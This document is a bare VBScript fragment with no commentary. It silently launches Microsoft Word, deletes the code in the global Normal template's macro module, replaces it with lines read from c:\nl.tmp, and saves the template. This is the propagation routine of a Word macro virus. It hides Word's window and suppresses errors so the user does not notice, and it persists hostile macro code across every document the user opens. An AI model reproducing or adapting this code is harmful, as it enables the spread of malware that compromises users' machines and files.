On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set oword = CreateObject("Word.Application")
oword.Visible = False
Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile("c:\nl.tmp", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
oword.NormalTemplate.Save
oword.NormalTemplate.Close
oword.quit
